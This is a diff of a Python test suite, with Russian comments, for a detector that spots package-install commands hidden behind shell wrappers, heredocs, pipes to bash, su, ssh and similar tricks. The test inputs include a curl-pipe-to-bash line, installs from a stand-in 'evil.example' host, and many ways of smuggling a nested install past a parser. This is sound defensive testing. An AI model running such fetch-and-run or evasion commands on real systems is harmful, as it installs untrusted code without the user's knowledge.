@@ -1,3 +1,4 @@
+import json
 import pathlib
 import shlex
 import sys
@@ -7,6 +8,11 @@ PLANKA_DIR = pathlib.Path(__file__).resolve().parent.parent / "plugin" / "planka
 sys.path.insert(0, str(PLANKA_DIR))
 import depcheck  # noqa: E402
 from tests.helpers import assert_linear  # noqa: E402
+
+# Корпус команд Bash: source — transcript (команды из транскриптов Claude Code автора в этом проекте, санитизированы:
+# без секретов, адресов, хостов и чужих проектов, домашний каталог — /home/user) или edge (образец края разбора);
+# expect — add (dependency_add), doubt (dependency_doubt) или pass.
+CORPUS = pathlib.Path(__file__).parent / "fixtures" / "bash-commands.jsonl"
 
 
 class DependencyAddTest(unittest.TestCase):
@@ -1339,13 +1345,14 @@ class ParserEdgesTest(unittest.TestCase):
         self.assertIsNone(depcheck.dependency_add("eval " * 5 + "npm install x"))
 
     def test_words_limit_boundary(self):
-        # README: на слова разбираются первые 4096 символов сегмента.
+        # README: на слова разбираются первые 4096 символов команды — слов с разделителем от её имени.
         self.assertEqual(depcheck._WORDS_LIMIT, 4096)
-        head = "npm install "
-        inside = head + " " * (4096 - len(head) - len("left-pad")) + "left-pad"
-        beyond = head + " " * (4096 - len(head)) + "left-pad"
+        head = "A=" + "a" * 5000 + " sudo -E npm install "
+        inside = head + "-D " * 1361 + "left-pad"
+        beyond = head + "-D " * 1362 + "left-pad"
         self.assertIsNotNone(depcheck.dependency_add(inside))
         self.assertIsNone(depcheck.dependency_add(beyond))
+        self.assertIn("4096", depcheck.dependency_doubt(beyond)[1])
 
 
 class NestedQuotesInSubstitutionTest(unittest.TestCase):
@@ -1505,7 +1512,7 @@ class ParserBranchesTest(unittest.TestCase):
         "deno i npm:chalk",
     ]
     NOT_ADDS = [
-        "uv tool install --with x --editable .",
+        "uv tool install --with ./x --editable .",
         "cargo install --version 1.0 --path .",
         "cargo install --version 1.0 --locked",
         "rye add --features x",
@@ -1698,7 +1705,7 @@ class DoubtTest(unittest.TestCase):
     """Сегмент с распознанными менеджером и командой установки, где пакет или подкоманда под сомнением, —
     dependency_doubt: (сегмент, довод)."""
 
-    LONG = "npm install " + " " * 4096 + "left-pad"
+    LONG = "npm install " + "-D " * 1400 + "left-pad"
     NESTED = _nest("cd app && npm install x", 6)
     FORMS = [
         # Флаг со значением вне известных наборов перед подкомандой.
@@ -1733,7 +1740,7 @@ class DoubtTest(unittest.TestCase):
         ("npx " * 12 + "npm install x", "npx " * 12 + "npm install x", "4"),
         ("python -m " * 12 + "pip install x", "python -m " * 12 + "pip install x", "4"),
         ("uv run " * 12 + "pip install x", "uv run " * 12 + "pip install x", "4"),
-        # Пакет дальше 4096 символов сегмента.
+        # Пакет дальше 4096 символов команды.
         (LONG, LONG, "4096"),
     ]
 
@@ -1764,7 +1771,7 @@ class DoubtTest(unittest.TestCase):
             # Длинный сегмент не менеджера или без команды установки.
             'git commit -m "' + "x " * 3000 + '; npm install x"', "npm run build " + "a " * 3000,
             # За 4096 символами — продолжение значения флага или только флаги, а не новое слово.
-            'npm install --tag "' + "a b " * 2000 + '"', "npm install " + " " * 4096 + "--save >log",
+            'npm install --tag "' + "a b " * 2000 + '"', "npm install " + "-D " * 1400 + "--save >log",
         ]:
             with self.subTest(cmd[:60]):
                 self.assertIsNone(depcheck.dependency_doubt(cmd))
@@ -1803,9 +1810,441 @@ class DoubtTest(unittest.TestCase):
             lambda n: "npx " * n + "npm install x",
             lambda n: "eval " * 5 + "pip install a" + " @" * n,
             lambda n: _nest('echo "$(' + "npm " * n + 'install x)"', 4),
-            lambda n: "npm install " + " " * 4096 + "@ " * n + "x",
+            lambda n: "npm install " + "-D " * 1400 + "@ " * n + "x",
         ]
         for make in cases:
             small, large = make(2000), make(8000)
             with self.subTest(small[:30]):
                 assert_linear(self, lambda: depcheck.dependency_doubt(small), lambda: depcheck.dependency_doubt(large))
+
+
+class HeredocBodySubstitutionTest(unittest.TestCase):
+    """Тело heredoc с терминатором без кавычек bash разбирает как текст в `"…"`: подстановки исполняются."""
+
+    def test_substitution_in_body_detected(self):
+        for cmd in ["cat <<EOF\n$(npm install left-pad)\nEOF", "cat <<EOF\n`pip install requests`\nEOF",
+                    "git commit -F - <<EOF\nmsg $(npm install left-pad)\nEOF", "cat <<-EOF\n\t$(npm i x)\n\tEOF",
+                    "cat <<EOF > f\na \"$(npm i x)\" b\nEOF", "cat <<EOF\n$(\nnpm i x\n)\nEOF\necho ok"]:
+            with self.subTest(cmd):
+                self.assertIsNotNone(depcheck.dependency_add(cmd))
+
+    def test_quoted_or_escaped_body_is_data(self):
+        for cmd in ["cat <<'EOF'\n$(npm install left-pad)\nEOF", 'cat <<"EOF"\n`npm i x`\nEOF',
+                    "cat <<\\EOF\n$(npm i x)\nEOF", "cat <<E'O'F\n$(npm i x)\nEOF",
+                    "cat <<EOF\n\\$(npm install x)\nEOF",
+                    "cat <<EOF\n\\`npm i x\\`\nEOF", "cat <<EOF\nnpm install x $(date)\nEOF",
+                    "cat <<EOF\n$((1 + 2)) it's \"npm install x\"\nEOF"]:
+            with self.subTest(cmd):
+                self.assertIsNone(depcheck.dependency_add(cmd))
+                self.assertIsNone(depcheck.dependency_doubt(cmd))
+
+    def test_doubt_in_body(self):
+        self.assertIsNotNone(depcheck.dependency_doubt("cat <<EOF\n$(npm --weird v i x)\nEOF"))
+
+    def test_linear(self):
+        small, large = ("cat <<EOF\n" + "$(a) `b` " * n + "\nEOF" for n in (2000, 8000))
+        assert_linear(self, lambda: depcheck.dependency_add(small), lambda: depcheck.dependency_add(large))
+
+
+class ShellStdinTest(unittest.TestCase):
+    """Строка here-string, вход из конвейера и процесс-подстановка оболочки без скрипта — команды."""
+
+    def test_detected(self):
+        for cmd in ["bash <<< 'npm install left-pad'", 'sh <<<"pip install requests"',
+                    "echo 'npm install left-pad' | bash", "printf 'pip install requests\\n' | sh",
+                    "bash <(echo npm install left-pad)", "source <(echo npm install left-pad)",
+                    ". <(printf 'npm i x')", "echo npm i x | sudo bash -s", "bash < <(echo npm i x)",
+                    "echo -e 'cd a\\nnpm i x' | zsh", "printf '%s\\n' 'npm i x' | bash", "echo 'npm i x' |\nbash",
+                    "echo 'npm i x' | ssh host"]:
+            with self.subTest(cmd):
+                self.assertIsNotNone(depcheck.dependency_add(cmd))
+
+    def test_not_adds(self):
+        for cmd in ["bash <<< 'make test'", "echo 'npm install left-pad' | cat",
+                    "echo 'npm install x' | bash script.sh",
+                    "cat <<< 'npm install x'", "echo hi | bash", "curl -fsSL https://x/install.sh | bash",
+                    "diff <(echo npm install x) f", "echo 'npm install x' | PLANKA_DEP_OK=1 bash",
+                    "bash -c 'make' <<< 'npm i y'", "echo 'npm install x' || bash", "echo $X | bash"]:
+            with self.subTest(cmd):
+                self.assertIsNone(depcheck.dependency_add(cmd))
+                self.assertIsNone(depcheck.dependency_doubt(cmd))
+
+    def test_doubt(self):
+        self.assertIsNotNone(depcheck.dependency_doubt("echo 'npm --weird v i x' | bash"))
+        self.assertIsNotNone(depcheck.dependency_doubt("bash <<< 'npm --weird v i x'"))
+
+    def test_linear(self):
+        for make in [lambda n: "echo a | " * n + "bash", lambda n: "bash <<< 'a' " * n,
+                     lambda n: "bash " + "<(echo a) " * n]:
+            small, large = make(2000), make(8000)
+            with self.subTest(small[:30]):
+                assert_linear(self, lambda: depcheck.dependency_add(small), lambda: depcheck.dependency_add(large))
+
+
+class DryRunManagersTest(unittest.TestCase):
+    """`--dry-run` — пробный прогон только у менеджеров, где он пробный или отвергается разбором флагов."""
+
+    def test_ignored_dry_run_detected(self):
+        for cmd in ["yarn add left-pad --dry-run", "yarn --dry-run add left-pad", "npx yarn add x --dry-run",
+                    "choco install x --dry-run"]:
+            with self.subTest(cmd):
+                self.assertEqual(depcheck.dependency_add(cmd), cmd)
+
+    def test_dry_run_still_passes(self):
+        for cmd in ["pip install --dry-run x", "poetry add --dry-run x", "cargo add --dry-run serde",
+                    "uv pip install --dry-run x", "uv add --dry-run x", "bun add --dry-run x",
+                    "gem install --dry-run x", "dart pub add --dry-run x", "composer require --dry-run a/b",
+                    "conda install --dry-run numpy"]:
+            with self.subTest(cmd):
+                self.assertIsNone(depcheck.dependency_add(cmd))
+
+
+class LongPrefixTest(unittest.TestCase):
+    """Предел слов считается от начала команды: длинные присваивания и обёртки её не прячут."""
+
+    def test_detected(self):
+        for cmd in ["A=" + "a" * 5000 + " npm install left-pad", "sudo " + "-E " * 2100 + "npm install left-pad",
+                    "env " + "A=b " * 1500 + "npm install left-pad", "npm install " + " " * 4096 + "left-pad"]:
+            with self.subTest(cmd[:30]):
+                self.assertIsNotNone(depcheck.dependency_add(cmd))
+
+    def test_linear(self):
+        for make in [lambda n: "env " + "A=b " * n + "npm install left-pad",
+                     lambda n: "sudo " + "-E " * n + "npm install left-pad",
+                     lambda n: "env " + "-S 'A=b' " * n + "npm install left-pad",
+                     lambda n: "A=" + "a" * n * 4 + " npm install " + "-D " * n + "x"]:
+            small, large = make(2000), make(8000)
+            with self.subTest(small[:30]):
+                assert_linear(self, lambda: depcheck.dependency_add(small), lambda: depcheck.dependency_add(large))
+                assert_linear(self, lambda: depcheck.dependency_doubt(small),
+                              lambda: depcheck.dependency_doubt(large))
+
+
+class GluedValueFlagTest(unittest.TestCase):
+    """Склейка короткого флага со значением: первая буква флага со значением забирает остаток слова."""
+
+    def test_detected(self):
+        for cmd in ["sudo -uroot npm install left-pad", "sudo -uubuntu npm install x", "pip install -tvendor requests",
+                    "sudo -iu root npm install x", "sudo -u root npm install x"]:
+            with self.subTest(cmd):
+                self.assertIsNotNone(depcheck.dependency_add(cmd))
+
+    def test_value_flag_last(self):
+        self.assertIsNone(depcheck.dependency_add("pip install -qr req.txt"))
+        self.assertTrue(depcheck._takes_value("-qr", {"-r"}))
+        self.assertFalse(depcheck._takes_value("-rq", {"-r"}))
+
+
+class AppendAssignmentTest(unittest.TestCase):
+    def test_detected(self):
+        for cmd in ["PATH+=:/opt/bin npm install left-pad", "A+=1 npm install left-pad",
+                    "PLANKA_DEP_OK+=1 npm install x"]:
+            with self.subTest(cmd):
+                self.assertIsNotNone(depcheck.dependency_add(cmd))
+
+
+class ExpandedNameTest(unittest.TestCase):
+    """Имя команды — подстановка или переменная; аргумент в обратных кавычках вне `"…"`."""
+
+    def test_backtick_argument_detected(self):
+        for cmd in ["npm install `echo left-pad`", "pip install `cat pkgs`"]:
+            with self.subTest(cmd):
+                self.assertIsNotNone(depcheck.dependency_add(cmd))
+
+    def test_doubt(self):
+        for cmd in ["M=npm; $M install left-pad", '"$(command -v npm)" install left-pad',
+                    "`which npm` install left-pad",
+                    "$(command -v npm) install left-pad", "${PM:-npm} add left-pad"]:
+            with self.subTest(cmd):
+                self.assertIsNone(depcheck.dependency_add(cmd))
+                self.assertIsNotNone(depcheck.dependency_doubt(cmd))
+
+    def test_linear(self):
+        for make in [lambda n: "npm install " + "$(a) " * n, lambda n: "npm install " + "`a` " * n,
+                     lambda n: "$(" * n + "npm install x", lambda n: "echo " + "<(a) " * n]:
+            small, large = make(2000), make(8000)
+            with self.subTest(small[:30]):
+                assert_linear(self, lambda: depcheck.dependency_add(small), lambda: depcheck.dependency_add(large))
+                assert_linear(self, lambda: depcheck.dependency_doubt(small),
+                              lambda: depcheck.dependency_doubt(large))
+
+    def test_not_doubt(self):
+        for cmd in ["$EDITOR file.txt", "$(npm bin)/eslint .", "`which python` -m pytest", "$M install",
+                    "echo `date` install x", "echo $(date) npm install x", "$PIP install -r req.txt",
+                    "PLANKA_DEP_OK=1 $M install x"]:
+            with self.subTest(cmd):
+                self.assertIsNone(depcheck.dependency_add(cmd))
+                self.assertIsNone(depcheck.dependency_doubt(cmd))
+
+
+class MoreLaunchersTest(unittest.TestCase):
+    """Запускатели и обёртки, исполняющие следующую команду."""
+
+    DETECTED = ["npm exec pnpm add left-pad", "npm exec -- pnpm add x", "npm x -y pnpm@9 add x",
+                "pnpm dlx pnpm add x", "pnpm exec npm install x", "yarn dlx npm i x", "yarn exec npm i x",
+                "bun x npm install x", "bundle exec gem install foo", "setsid npm install x", "setsid -f npm i x",
+                "su -c 'npm install x'", "su root -c 'npm install x'", "su - root --command='npm i x'",
+                "flock /tmp/l npm install x", "flock -w 5 /tmp/l -c 'npm i x'", "ionice -c3 npm i x",
+                "ionice -c 3 npm i x", "watch -n 5 npm install x", "find . -exec npm install left-pad \\;",
+                "find . -name a -execdir pip install x {} +", "trap 'npm install left-pad' EXIT",
+                "coproc npm install x",
+                "busybox sh -c 'npm i x'", "cmd /c npm install x", "cmd.exe /C npm i x",
+                'pwsh -Command "npm install x"', "powershell -c npm i x", "nix develop -c npm install x",
+                "nix shell nixpkgs#nodejs --command npm i x", "nix-shell -p nodejs --run 'npm i x'",
+                "mise exec -- npm install x", "mise x node@20 -- npm i x", 'ssh host "npm install left-pad"',
+                "ssh -p 22 host npm install x"]
+    NOT_ADDS = ["npm exec eslint .", "pnpm dlx create-vite app", "bundle exec rake", "find . -exec rm {} \\;",
+                "trap 'rm -f t' EXIT", "trap - EXIT", "cmd /c dir", "nix develop -c make", "mise exec -- make",
+                "ssh host ls", "ssh host", "flock /tmp/l make", "su -c 'make'", "watch -n 5 ls",
+                "PLANKA_DEP_OK=1 ssh host npm i x", "find . -name x"]
+
+    def test_detected(self):
+        for cmd in self.DETECTED:
+            with self.subTest(cmd):
+                self.assertIsNotNone(depcheck.dependency_add(cmd))
+
+    def test_not_adds(self):
+        for cmd in self.NOT_ADDS:
+            with self.subTest(cmd):
+                self.assertIsNone(depcheck.dependency_add(cmd))
+                self.assertIsNone(depcheck.dependency_doubt(cmd))
+
+    def test_linear(self):
+        for make in [lambda n: "find . " + "-exec a \\; " * n, lambda n: "trap " + "a " * n,
+                     lambda n: "ssh h " + "a " * n, lambda n: "su " + "-c a " * n,
+                     lambda n: "pwsh " + "-x " * n + "-c npm i x", lambda n: "npm exec " + "-y " * n + "pnpm add x"]:
+            small, large = make(2000), make(8000)
+            with self.subTest(small[:30]):
+                assert_linear(self, lambda: depcheck.dependency_add(small), lambda: depcheck.dependency_add(large))
+                assert_linear(self, lambda: depcheck.dependency_doubt(small),
+                              lambda: depcheck.dependency_doubt(large))
+
+
+class UserAndWatchWrappersTest(unittest.TestCase):
+    """runuser с `-u` запускает команду без оболочки; su/runuser разбирают флаги как getopt; watch без `-x`
+    склеивает слова команды в строку `sh -c`."""
+
+    DETECTED = ["su --shell= app <<< 'npm i x'", "runuser -u app -- npm i x", "runuser -u app npm i x",
+                "runuser --user=app -- npm i x", "runuser -uapp -- npm i x", "runuser -m -u app -- pip install x",
+                "runuser -g grp -u app -- npm i x",
+                "runuser -u app -g grp npm i x", "runuser -u app -- npm install -g x",
+                "su -c'npm i x'", "su -lc 'npm i x' app", "su - app -lc 'npm i x'",
+                "su --session-command 'npm i x' app", "su --session-command='npm i x'",
+                "runuser -l app -c 'npm i x'",
+                "watch -n 5 'npm i x'", "watch 'pip install x'", "watch -n5 -d 'npm install x'",
+                "watch -s /tmp/shots 'npm i x'", "watch -x npm i x", "watch -x -n 5 npm i x", "watch -tx npm i x",
+                "watch --exec npm i x", "watch -- 'npm i x'",
+                # У su/runuser без `-u` слова за пользователем — аргументы оболочки, `-c` среди них — её строка.
+                "su app -- -c 'npm i x'", "su - app -- -c 'npm i x'", "runuser app -- -c 'npm i x'",
+                "runuser -l app -- -c 'npm i x'", "su app -- -lc 'npm i x'", "su app -- -e -c 'npm i x'",
+                # watch разбирает склейку по optstring: буква со значением забирает остаток слова.
+                "watch -x sh -c 'npm i x'", "watch -xn5 sh -c 'npm i x'", "watch -xn 5 sh -c 'npm i x'",
+                "watch -txq5 sh -c 'npm i x'",
+                # su/runuser без `-c` и `-u` запускают оболочку: без аргументов она читает stdin.
+                "su app <<'E'\nnpm i x\nE", "echo 'npm i x' | su app", "echo 'npm i x' | su", "su <<< 'npm i x'",
+                "runuser app <<< 'npm i x'", "su -s /bin/bash app <<< 'npm i x'",
+                # `-s`/`--shell` — программа вместо оболочки, слова за пользователем — её аргументы.
+                "su -s /usr/bin/npm app -- install x", "runuser -s /usr/bin/pip3 app -- install requests",
+                "su --shell=/usr/bin/npm root -- i x"]
+    NOT_ADDS = ["su --user=app npm i x", "su --shell= app -- npm i x",
+                "runuser -u app -- make", "runuser -u app", "runuser app", "runuser - app",
+                "su -lc 'make' app", "su -g npm app", "su - app",
+                "watch 'npm ls'", "watch -n 5 'ls -l'", "watch -x ls", "watch -s npm ls",
+                # Без `-c` и `-u`: первое слово — пользователь, остальные — аргументы оболочки без `-c`.
+                "su npm install x", "runuser npm i x", "su - npm i x", "su app -- script.sh npm i x",
+                # Без пользователя первое слово-не-флаг за `--` — имя пользователя (`-c`).
+                "su -- -c 'npm i x'",
+                # Без `-x` слова склеиваются в строку `sh -c npm i x`: оболочка запускает `npm` без аргументов.
+                "watch sh -c 'npm i x'", "watch -n5x sh -c 'npm i x'", "watch -dx sh -c 'npm i x'",
+                # `--execX` — не `--exec`: watch его не принимает.
+                "watch --execX sh -c 'npm i x'",
+                # Программа `-s` не оболочка: stdin ей не команды.
+                "su -s /usr/bin/npm app <<< 'i x'", "su -s /usr/bin/npm app -- ls"]
+
+    def test_detected(self):
+        for cmd in self.DETECTED:
+            with self.subTest(cmd):
+                self.assertIsNotNone(depcheck.dependency_add(cmd))
+
+    def test_not_adds(self):
+        for cmd in self.NOT_ADDS:
+            with self.subTest(cmd):
+                self.assertIsNone(depcheck.dependency_add(cmd))
+                self.assertIsNone(depcheck.dependency_doubt(cmd))
+
+    def test_linear(self):
+        for make in [lambda n: "runuser -u app " + "-m " * n + "-- npm i x", lambda n: "watch " + "a " * n,
+                     lambda n: "su " + "-lc a " * n, lambda n: "runuser -u a -- " * n + "npm i x",
+                     lambda n: "su a -- " * n + "-c 'npm i x'",
+                     lambda n: "runuser -u a runuser runuser -- " * n + "npm i x"]:
+            small, large = make(2000), make(8000)
+            with self.subTest(small[:30]):
+                assert_linear(self, lambda: depcheck.dependency_add(small), lambda: depcheck.dependency_add(large))
+                assert_linear(self, lambda: depcheck.dependency_doubt(small),
+                              lambda: depcheck.dependency_doubt(large))
+
+
+class WrapperLimitTest(unittest.TestCase):
+    """Обёрток в сегменте больше _MAX_WRAPPERS: любая команда за ними — сомнение; маркер в начале сегмента его
+    снимает."""
+
+    def test_within_limit(self):
+        cmd = "nice " * depcheck._MAX_WRAPPERS + "npm i x"
+        self.assertIsNotNone(depcheck.dependency_add(cmd))
+
+    def test_over_limit(self):
+        for cmd in ["nice " * (depcheck._MAX_WRAPPERS + 1) + "npm i x",
+                    "runuser -u a runuser runuser -- " * 50 + "npm i x",
+                    "sudo " * 50 + "su -c 'pip install x'"]:
+            with self.subTest(cmd[:30]):
+                self.assertIsNone(depcheck.dependency_add(cmd))
+                self.assertEqual(depcheck.dependency_doubt(cmd), (cmd, depcheck._WHY_WRAPPERS))
+
+    def test_marker_at_segment_start(self):
+        over = "nice " * (depcheck._MAX_WRAPPERS + 1)
+        self.assertIsNone(depcheck.dependency_doubt("PLANKA_DEP_OK=1 " + over + "npm i x"))
+        why = depcheck.dependency_doubt(over + "PLANKA_DEP_OK=1 npm i x")[1]
+        self.assertIn("маркер согласия — в начале сегмента", why)
+
+    def test_over_limit_any_command(self):
+        # За пределом обёрток любая команда, в том числе без менеджера, — сомнение.
+        over = "nice " * (depcheck._MAX_WRAPPERS + 1)
+        for cmd in [over + "make", over + "su -c'npm i x'", over + "env -S'npm i x'",
+                    over + "python3 -mpip install x", over + "sh -c 'cd /a&&npm i x'", over + "sh <<< 'npm i x'",
+                    "echo 'npm i x' | " + "sudo " * 16 + "su",
+                    "sudo " * 16 + "su app <<'E'\nnpm i x\nE"]:
+            with self.subTest(cmd[-30:]):
+                self.assertIsNone(depcheck.dependency_add(cmd))
+                self.assertEqual(depcheck.dependency_doubt(cmd)[1], depcheck._WHY_WRAPPERS)
+
+
+class HatchTest(unittest.TestCase):
+    def test_detected(self):
+        for cmd in ["hatch -e test run pip install requests", "hatch run test:pip install requests",
+                    "hatch --env test run pip install x"]:
+            with self.subTest(cmd):
+                self.assertIsNotNone(depcheck.dependency_add(cmd))
+
+    def test_not_adds(self):
+        for cmd in ["hatch run test:cov", "hatch -e test run pytest", "hatch env create"]:
+            with self.subTest(cmd):
+                self.assertIsNone(depcheck.dependency_add(cmd))
+
+
+class CommandCaseTest(unittest.TestCase):
+    """Имя команды сравнивается без учёта регистра: на macOS и Windows `NPM` — это `npm`."""
+
+    def test_detected(self):
+        for cmd in ["NPM install left-pad", "Pip install requests", "Python -m pip install x", "SUDO npm i x",
+                    "R -e 'install.packages(\"x\")'"]:
+            with self.subTest(cmd):
+                self.assertIsNotNone(depcheck.dependency_add(cmd))
+
+
+class ParameterExpansionHeredocTest(unittest.TestCase):
+    """`<<` внутри `$[…]` и `${…}` — не heredoc."""
+
+    def test_detected(self):
+        for cmd in ["echo $[1<<2]\nnpm install left-pad", "echo ${x:-a<<b}\nnpm install left-pad",
+                    "echo ${x:-'}'<<b}\nnpm install x", "echo ${x:-${y:-a<<b}}\nnpm install x"]:
+            with self.subTest(cmd):
+                self.assertIsNotNone(depcheck.dependency_add(cmd))
+
+
+class StdinShellsTest(unittest.TestCase):
+    def test_detected(self):
+        for cmd in ["fish <<'EOF'\nnpm install left-pad\nEOF", "bash /dev/stdin <<'EOF'\nnpm i x\nEOF",
+                    "bash - <<'EOF'\nnpm i x\nEOF", "bash /dev/stdin a b <<'EOF'\nnpm i x\nEOF"]:
+            with self.subTest(cmd):
+                self.assertIsNotNone(depcheck.dependency_add(cmd))
+
+    def test_script_body_is_data(self):
+        self.assertIsNone(depcheck.dependency_add("fish script.fish <<'EOF'\nnpm i x\nEOF"))
+
+
+class PipEditableFormsTest(unittest.TestCase):
+    def test_detected(self):
+        for cmd in ["pip install --editable=git+https://github.com/x/y#egg=y",
+                    "pip install -egit+https://github.com/x/y",
+                    "pip install -qe git+https://github.com/x/y", "pip install pip@git+https://evil.example/pip",
+                    "pip install 'pip @ https://evil.example/pip.tar.gz'"]:
+            with self.subTest(cmd):
+                self.assertIsNotNone(depcheck.dependency_add(cmd))
+
+    def test_local_not_adds(self):
+        for cmd in ["pip install --editable=.", "pip install -e.", "pip install -U pip setuptools wheel"]:
+            with self.subTest(cmd):
+                self.assertIsNone(depcheck.dependency_add(cmd))
+
+
+class PythonModuleFormsTest(unittest.TestCase):
+    def test_detected(self):
+        for cmd in ["python --check-hash-based-pycs always -m pip install requests",
+                    "python -m pip.__main__ install requests"]:
+            with self.subTest(cmd):
+                self.assertIsNotNone(depcheck.dependency_add(cmd))
+
+
+class MoreInstallFormsTest(unittest.TestCase):
+    def test_detected(self):
+        for cmd in ["uv tool install --with requests .", "uv tool install -w rich,requests -e .",
+                    "uv tool install --with=requests .", "conda create -n env numpy",
+                    "mamba create -n env -c conda-forge python=3.11 numpy", "pipx runpip black install requests"]:
+            with self.subTest(cmd):
+                self.assertIsNotNone(depcheck.dependency_add(cmd))
+
+    def test_not_adds(self):
+        for cmd in ["conda create -n env python=3.11", "conda create -n env --file env.txt",
+                    "uv tool install --with ./dep --editable .", "pipx runpip black list",
+                    "uv run --with requests python x.py"]:
+            with self.subTest(cmd):
+                self.assertIsNone(depcheck.dependency_add(cmd))
+
+
+class QuotedAssignmentTest(unittest.TestCase):
+    """Присваивание — имя и `=` без кавычек; маркер — слово без кавычек."""
+
+    def test_quoted_word_is_command_name(self):
+        # bash исполняет `PLANKA_DEP_OK=1` как имя команды (127): npm не запускается.
+        self.assertIsNone(depcheck.dependency_add("'PLANKA_DEP_OK=1' npm install left-pad"))
+        self.assertIsNone(depcheck.dependency_add("\"A=1\" npm install left-pad"))
+
+    def test_quoted_marker_value_does_not_count(self):
+        for cmd in ['PLANKA_DEP_OK="1" npm install x', "PLANKA_DEP_OK='1' npm install x",
+                    "PLANKA_DEP_OK=\\1 npm install x"]:
+            with self.subTest(cmd):
+                self.assertIsNotNone(depcheck.dependency_add(cmd))
+
+    def test_quoted_value_still_assignment(self):
+        self.assertIsNotNone(depcheck.dependency_add("A='x y' npm install left-pad"))
+        self.assertIsNone(depcheck.dependency_add("A='x y' PLANKA_DEP_OK=1 npm install left-pad"))
+
+
+class CorpusTest(unittest.TestCase):
+    """Разбор всего корпуса настоящих команд Bash и образцов краёв."""
+
+    def test_corpus(self):
+        with CORPUS.open(encoding="utf-8") as f:
+            rows = [json.loads(line) for line in f if line.strip()]
+        self.assertGreater(sum(r["source"] == "transcript" for r in rows), 1000)
+        for row in rows:
+            command = row["command"]
+            with self.subTest(command[:80]):
+                added = depcheck.dependency_add(command)
+                got = "add" if added is not None else "doubt" if depcheck.dependency_doubt(command) else "pass"
+                self.assertEqual(got, row["expect"])
+
+
+class CutInlineScriptTest(unittest.TestCase):
+    """Строка `eval`/`sh -c` за пределом слов команды не видна: сомнение."""
+
+    def test_doubt(self):
+        for cmd in ["eval " + "a " * 3000 + "npm i x", "sh " + "-o x " * 1000 + "-c 'npm i x'"]:
+            with self.subTest(cmd[:30]):
+                self.assertIsNone(depcheck.dependency_add(cmd))
+                self.assertIn("4096", depcheck.dependency_doubt(cmd)[1])
+
+    def test_not_doubt(self):
+        for cmd in ["sh -c 'make' " + "a " * 3000, "bash script.sh " + "a " * 3000, "eval " + "a " * 100]:
+            with self.subTest(cmd[:30]):
+                self.assertIsNone(depcheck.dependency_doubt(cmd))
